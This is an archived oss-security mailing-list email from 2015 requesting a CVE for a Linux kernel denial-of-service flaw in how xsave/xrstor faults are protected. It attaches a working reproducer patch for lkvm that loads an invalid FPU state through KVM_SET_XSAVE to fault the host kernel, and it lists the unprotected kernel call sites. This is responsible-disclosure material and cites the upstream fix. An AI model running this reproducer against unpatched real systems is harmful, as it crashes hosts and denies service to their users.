X-VM-v5-Data: ([nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
	["13221" "Wednesday" "18" "March" "2015" "11:14:05" "+0100" "Quentin Casasnovas" "quentin.casasnovas@oracle.com" "<20150318101405.GA19065@chrystal.uk.oracle.com>" "250" "[oss-security] CVE Request: Linux kernel unprivileged denial-of-service due to mis-protected xsave/xrstor instructions." nil nil nil "3" "2015031810:14:05" "[oss-security] CVE Request: Linux kernel unprivileged denial-of-service due to mis-protected xsave/xrstor instructions." (number mark "        quentin.casa Mar 18  250/13221 " thread-indent "\"[oss-security] CVE Request: Linux kernel unprivileged denial-of-service due to mis-protected xsave/xrstor instructions.\"\n") nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
	nil)
X-Mozilla-Status: 0001
X-Mozilla-Status2: 00000000
Received: (qmail 17837 invoked by uid 550); 18 Mar 2015 10:17:26 -0000
Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
Precedence: bulk
List-Post: <mailto:oss-security@lists.openwall.com>
List-Help: <mailto:oss-security-help@lists.openwall.com>
List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
List-ID: <oss-security.lists.openwall.com>
Received: (qmail 13369 invoked from network); 18 Mar 2015 10:12:18 -0000
Message-ID: <20150318101405.GA19065@chrystal.uk.oracle.com>
MIME-Version: 1.0
Content-Type: multipart/mixed; boundary="YiEDa0DAkWCtVeE4"
Content-Disposition: inline
User-Agent: Mutt/1.5.22 (2013-10-16)
X-Source-IP: userv0022.oracle.com [156.151.31.74]
Cc: Jamie Iles <jamie.iles@oracle.com>, Allan Xavier <mr.a.xavier@gmail.com>
Date: Wed, 18 Mar 2015 11:14:05 +0100
From: Quentin Casasnovas <quentin.casasnovas@oracle.com>
Reply-To: oss-security@lists.openwall.com
Subject: [oss-security] CVE Request: Linux kernel unprivileged denial-of-service due to
 mis-protected xsave/xrstor instructions.
To: CVE-assign <cve-assign@mitre.org>,
        oss-sec <oss-security@lists.openwall.com>

--YiEDa0DAkWCtVeE4
Content-Type: text/plain; charset=us-ascii
Content-Disposition: inline

Hi,

Jamie and I discovered there was a flaw in the way the xsave/xrstor (and
their alternative instructions) were being protected against a fault in
kernel space from linux 3.15.  The problem was introduced in commit f31a9f7
("x86/xsaves: Use xsaves/xrstors to save and restore xsave area") which
ends up protecting the .altinstr_replacement from faulting instead of the
target of the alternative in .text, leaving the instruction un-protected.

You can find a reproducer (thanks to Allan for his help with/comments on
it!) triggering the fault in kernel space attached to this e-mail but it
should be noted there are a few different places where these instructions
are used un-protected and the reproducer only uses one of them present in
the kvm code.  You can find a list of all such places in the attached
unprotected_xsave_faults attachment which was generated against a v4.0-rc1
defconfig + CONFIG_KVM vmlinux.o (the most concerning one probably being in
__switch_to()).  The reproducer is a patch to apply on top of lkvm
(https://github.com/penberg/linux-kvm) but it should be trivial to write as
a standalone C application.

It should be noted that this vulnerability is present even if the hardware
does not support xsaveS.

This is fixed by upstream commit 06c8173eb:

  https://git.kernel.org/cgit/linux/kernel/git/torvalds/linux.git/commit?id=06c8173eb92bbfc03a0fe8bb64315857d0badd06

Other patches to prevent introduction of the same class of vulnerability
are currently being reviewed on lkml:

  https://lkml.org/lkml/2015/3/17/462

I haven't received any news from cve-assign when this issue was previously
discussed on security@kernel.org.  Could a CVE be assigned to this please?

Thanks,
Quentin

--YiEDa0DAkWCtVeE4
Content-Type: text/x-diff; charset=us-ascii
Content-Disposition: attachment; filename="xsave-fault-reproducer.patch"

>From 5d7427ace0a94f842610a9823d5230335dbae301 Mon Sep 17 00:00:00 2001
From: Quentin Casasnovas <quentin.casasnovas@oracle.com>
Subject: [PATCH] lkvm: hack the fpu for fun and profit.

Signed-off-by: Quentin Casasnovas <quentin.casasnovas@oracle.com>
---
 tools/kvm/kvm-cpu.c | 61 +++++++++++++++++++++++++++++++++++++++++++++++++++++
 1 file changed, 61 insertions(+)

diff --git tools/kvm/kvm-cpu.c tools/kvm/kvm-cpu.c
index 5d90664..87d9641 100644
--- tools/kvm/kvm-cpu.c
+++ tools/kvm/kvm-cpu.c
@@ -30,6 +30,65 @@ void kvm_cpu__enable_singlestep(struct kvm_cpu *vcpu)
 		pr_warning("KVM_SET_GUEST_DEBUG failed");
 }
 
+static struct kvm_xsave xsave;
+
+static void kvm__sighandler(int signum, siginfo_t* infop, void* context_p)
+{
+	ucontext_t* context = context_p;
+	struct sigcontext* scontext = (void *) &context->uc_mcontext;
+	struct _fpstate* fpstate = scontext->fpstate;
+	/* uint64_t* xstate_bv = (void*) (fpstate + 1); */
+	/* uint64_t* xcomp_bv = xstate_bv + 1; */
+
+	memcpy(&xsave, fpstate, sizeof(*fpstate));
+
+	return;
+}
+
+static void kvm__install_handler(void)
+{
+	struct sigaction sa = {
+		.sa_sigaction = kvm__sighandler
+	};
+
+	sigfillset(&sa.sa_mask);
+	sa.sa_flags = SA_SIGINFO;
+
+	sigaction(SIGUSR1, &sa, NULL);
+}
+
+static void kvm__copy_xsave_from_signal_stack(void)
+{
+	static int already_installed = 0;
+
+	if (already_installed)
+		return;
+
+	kvm__install_handler();
+	raise(SIGUSR1);
+	already_installed = 1;
+}
+
+static void kvm__hijack_xsave(struct kvm_cpu* vcpu)
+{
+	int err = 0;
+	struct _fpstate *fpstate = (void*) &xsave;
+
+	fpstate->mxcsr = ~0U;
+
+	err = ioctl(vcpu->vcpu_fd, KVM_SET_XSAVE, fpstate);
+	if (err)
+		die_perror("KVM_GET_XSAVE failed");
+}
+
+static void kvm_cpu__mess_fpu(struct kvm_cpu* vcpu)
+{
+	kvm__copy_xsave_from_signal_stack();
+	kvm__hijack_xsave(vcpu);
+
+	return;
+}
+
 void kvm_cpu__run(struct kvm_cpu *vcpu)
 {
 	int err;
@@ -37,6 +96,8 @@ void kvm_cpu__run(struct kvm_cpu *vcpu)
 	if (!vcpu->is_running)
 		return;
 
+	kvm_cpu__mess_fpu(vcpu);
+
 	err = ioctl(vcpu->vcpu_fd, KVM_RUN, 0);
 	if (err < 0 && (errno != EINTR && errno != EAGAIN))
 		die_perror("KVM_RUN failed");
-- 
2.0.5


--YiEDa0DAkWCtVeE4
Content-Type: text/plain; charset=us-ascii
Content-Disposition: attachment; filename=unprotected_xsave_faults

Error: found a reference to .altinstr_replacement in __ex_table:
	xrstor_state at /home/quentin/linux-2.6/./arch/x86/include/asm/xsave.h:179
	 (inlined by) fpu_xrstor_checking at /home/quentin/linux-2.6/./arch/x86/include/asm/xsave.h:207
	 (inlined by) fpu_restore_checking at /home/quentin/linux-2.6/./arch/x86/include/asm/fpu-internal.h:284
	 (inlined by) kvm_load_guest_fpu at /home/quentin/linux-2.6/arch/x86/kvm/x86.c:6986
Error: found a reference to .altinstr_replacement in __ex_table:
	xsave_state at /home/quentin/linux-2.6/./arch/x86/include/asm/xsave.h:150
	 (inlined by) fpu_xsave at /home/quentin/linux-2.6/./arch/x86/include/asm/xsave.h:199
	 (inlined by) fpu_save_init at /home/quentin/linux-2.6/./arch/x86/include/asm/fpu-internal.h:246
	 (inlined by) kvm_put_guest_fpu at /home/quentin/linux-2.6/arch/x86/kvm/x86.c:6998
Error: found a reference to .altinstr_replacement in __ex_table:
	xsave_state at /home/quentin/linux-2.6/./arch/x86/include/asm/xsave.h:150
	 (inlined by) fpu_xsave at /home/quentin/linux-2.6/./arch/x86/include/asm/xsave.h:199
	 (inlined by) fpu_save_init at /home/quentin/linux-2.6/./arch/x86/include/asm/fpu-internal.h:246
	 (inlined by) __save_init_fpu at /home/quentin/linux-2.6/./arch/x86/include/asm/fpu-internal.h:278
	 (inlined by) switch_fpu_prepare at /home/quentin/linux-2.6/./arch/x86/include/asm/fpu-internal.h:432
	 (inlined by) __switch_to at /home/quentin/linux-2.6/arch/x86/kernel/process_64.c:284
Error: found a reference to .altinstr_replacement in __ex_table:
	xrstor_state at /home/quentin/linux-2.6/./arch/x86/include/asm/xsave.h:179
	 (inlined by) fpu_xrstor_checking at /home/quentin/linux-2.6/./arch/x86/include/asm/xsave.h:207
	 (inlined by) fpu_restore_checking at /home/quentin/linux-2.6/./arch/x86/include/asm/fpu-internal.h:284
	 (inlined by) restore_fpu_checking at /home/quentin/linux-2.6/./arch/x86/include/asm/fpu-internal.h:306
	 (inlined by) switch_fpu_finish at /home/quentin/linux-2.6/./arch/x86/include/asm/fpu-internal.h:468
	 (inlined by) __switch_to at /home/quentin/linux-2.6/arch/x86/kernel/process_64.c:399
Error: found a reference to .altinstr_replacement in __ex_table:
	xrstor_state at /home/quentin/linux-2.6/./arch/x86/include/asm/xsave.h:179
	 (inlined by) drop_init_fpu at /home/quentin/linux-2.6/./arch/x86/include/asm/fpu-internal.h:383
	 (inlined by) switch_fpu_finish at /home/quentin/linux-2.6/./arch/x86/include/asm/fpu-internal.h:469
	 (inlined by) __switch_to at /home/quentin/linux-2.6/arch/x86/kernel/process_64.c:399
Error: found a reference to .altinstr_replacement in __ex_table:
	xrstor_state at /home/quentin/linux-2.6/./arch/x86/include/asm/xsave.h:179
	 (inlined by) drop_init_fpu at /home/quentin/linux-2.6/./arch/x86/include/asm/fpu-internal.h:383
	 (inlined by) handle_signal at /home/quentin/linux-2.6/arch/x86/kernel/signal.c:682
	 (inlined by) do_signal at /home/quentin/linux-2.6/arch/x86/kernel/signal.c:705
Error: found a reference to .altinstr_replacement in __ex_table:
	xrstor_state at /home/quentin/linux-2.6/./arch/x86/include/asm/xsave.h:179
	 (inlined by) fpu_xrstor_checking at /home/quentin/linux-2.6/./arch/x86/include/asm/xsave.h:207
	 (inlined by) fpu_restore_checking at /home/quentin/linux-2.6/./arch/x86/include/asm/fpu-internal.h:284
	 (inlined by) restore_fpu_checking at /home/quentin/linux-2.6/./arch/x86/include/asm/fpu-internal.h:306
	 (inlined by) math_state_restore at /home/quentin/linux-2.6/arch/x86/kernel/traps.c:865
Error: found a reference to .altinstr_replacement in __ex_table:
	xrstor_state at /home/quentin/linux-2.6/./arch/x86/include/asm/xsave.h:179
	 (inlined by) drop_init_fpu at /home/quentin/linux-2.6/./arch/x86/include/asm/fpu-internal.h:383
	 (inlined by) math_state_restore at /home/quentin/linux-2.6/arch/x86/kernel/traps.c:866
Error: found a reference to .altinstr_replacement in __ex_table:
	xsave_state at /home/quentin/linux-2.6/./arch/x86/include/asm/xsave.h:150
	 (inlined by) __save_fpu at /home/quentin/linux-2.6/./arch/x86/include/asm/fpu-internal.h:517
	 (inlined by) save_init_fpu at /home/quentin/linux-2.6/./arch/x86/include/asm/fpu-internal.h:530
	 (inlined by) math_error at /home/quentin/linux-2.6/arch/x86/kernel/traps.c:737
Error: found a reference to .altinstr_replacement in __ex_table:
	xsave_state at /home/quentin/linux-2.6/./arch/x86/include/asm/xsave.h:150
	 (inlined by) fpu_xsave at /home/quentin/linux-2.6/./arch/x86/include/asm/xsave.h:199
	 (inlined by) fpu_save_init at /home/quentin/linux-2.6/./arch/x86/include/asm/fpu-internal.h:246
	 (inlined by) __save_init_fpu at /home/quentin/linux-2.6/./arch/x86/include/asm/fpu-internal.h:278
	 (inlined by) save_init_fpu at /home/quentin/linux-2.6/./arch/x86/include/asm/fpu-internal.h:535
	 (inlined by) math_error at /home/quentin/linux-2.6/arch/x86/kernel/traps.c:737
Error: found a reference to .altinstr_replacement in __ex_table:
	xsave_state at /home/quentin/linux-2.6/./arch/x86/include/asm/xsave.h:150
	 (inlined by) __save_fpu at /home/quentin/linux-2.6/./arch/x86/include/asm/fpu-internal.h:517
	 (inlined by) fpu_copy at /home/quentin/linux-2.6/./arch/x86/include/asm/fpu-internal.h:598
	 (inlined by) arch_dup_task_struct at /home/quentin/linux-2.6/arch/x86/kernel/process.c:78
Error: found a reference to .altinstr_replacement in __ex_table:
	xrstor_state at /home/quentin/linux-2.6/./arch/x86/include/asm/xsave.h:179
	 (inlined by) drop_init_fpu at /home/quentin/linux-2.6/./arch/x86/include/asm/fpu-internal.h:383
	 (inlined by) flush_thread at /home/quentin/linux-2.6/arch/x86/kernel/process.c:134
Error: found a reference to .altinstr_replacement in __ex_table:
	xsave_state at /home/quentin/linux-2.6/./arch/x86/include/asm/xsave.h:150
	 (inlined by) fpu_xsave at /home/quentin/linux-2.6/./arch/x86/include/asm/xsave.h:199
	 (inlined by) fpu_save_init at /home/quentin/linux-2.6/./arch/x86/include/asm/fpu-internal.h:246
	 (inlined by) __save_init_fpu at /home/quentin/linux-2.6/./arch/x86/include/asm/fpu-internal.h:278
	 (inlined by) __kernel_fpu_begin at /home/quentin/linux-2.6/arch/x86/kernel/i387.c:96
Error: found a reference to .altinstr_replacement in __ex_table:
	xsave_state at /home/quentin/linux-2.6/./arch/x86/include/asm/xsave.h:150
	 (inlined by) fpu_xsave at /home/quentin/linux-2.6/./arch/x86/include/asm/xsave.h:199
	 (inlined by) fpu_save_init at /home/quentin/linux-2.6/./arch/x86/include/asm/fpu-internal.h:246
	 (inlined by) __save_init_fpu at /home/quentin/linux-2.6/./arch/x86/include/asm/fpu-internal.h:278
	 (inlined by) unlazy_fpu at /home/quentin/linux-2.6/arch/x86/kernel/i387.c:123
Error: found a reference to .altinstr_replacement in __ex_table:
	xrstor_state at /home/quentin/linux-2.6/./arch/x86/include/asm/xsave.h:179
	 (inlined by) fpu_xrstor_checking at /home/quentin/linux-2.6/./arch/x86/include/asm/xsave.h:207
	 (inlined by) fpu_restore_checking at /home/quentin/linux-2.6/./arch/x86/include/asm/fpu-internal.h:284
	 (inlined by) restore_fpu_checking at /home/quentin/linux-2.6/./arch/x86/include/asm/fpu-internal.h:306
	 (inlined by) __kernel_fpu_end at /home/quentin/linux-2.6/arch/x86/kernel/i387.c:109
Error: found a reference to .altinstr_replacement in __ex_table:
	xrstor_state at /home/quentin/linux-2.6/./arch/x86/include/asm/xsave.h:179
	 (inlined by) drop_init_fpu at /home/quentin/linux-2.6/./arch/x86/include/asm/fpu-internal.h:383
	 (inlined by) __kernel_fpu_end at /home/quentin/linux-2.6/arch/x86/kernel/i387.c:110
Error: found a reference to .altinstr_replacement in __ex_table:
	xrstor_state at /home/quentin/linux-2.6/./arch/x86/include/asm/xsave.h:173
	 (inlined by) restore_user_xstate at /home/quentin/linux-2.6/arch/x86/kernel/xsave.c:319
	 (inlined by) __restore_xstate_sig at /home/quentin/linux-2.6/arch/x86/kernel/xsave.c:417
Error: found a reference to .altinstr_replacement in __ex_table:
	xrstor_state at /home/quentin/linux-2.6/./arch/x86/include/asm/xsave.h:179
	 (inlined by) drop_init_fpu at /home/quentin/linux-2.6/./arch/x86/include/asm/fpu-internal.h:383
	 (inlined by) __restore_xstate_sig at /home/quentin/linux-2.6/arch/x86/kernel/xsave.c:418
Error: found a reference to .altinstr_replacement in __ex_table:
	xrstor_state at /home/quentin/linux-2.6/./arch/x86/include/asm/xsave.h:179
	 (inlined by) drop_init_fpu at /home/quentin/linux-2.6/./arch/x86/include/asm/fpu-internal.h:383
	 (inlined by) __restore_xstate_sig at /home/quentin/linux-2.6/arch/x86/kernel/xsave.c:345
Error: found a reference to .altinstr_replacement in __ex_table:
	xrstor_state at /home/quentin/linux-2.6/./arch/x86/include/asm/xsave.h:173
	 (inlined by) restore_user_xstate at /home/quentin/linux-2.6/arch/x86/kernel/xsave.c:324
	 (inlined by) __restore_xstate_sig at /home/quentin/linux-2.6/arch/x86/kernel/xsave.c:417
Error: found a reference to .altinstr_replacement in __ex_table:
	xrstor_state at /home/quentin/linux-2.6/./arch/x86/include/asm/xsave.h:179
	 (inlined by) eager_fpu_init at /home/quentin/linux-2.6/arch/x86/kernel/xsave.c:715

--YiEDa0DAkWCtVeE4--
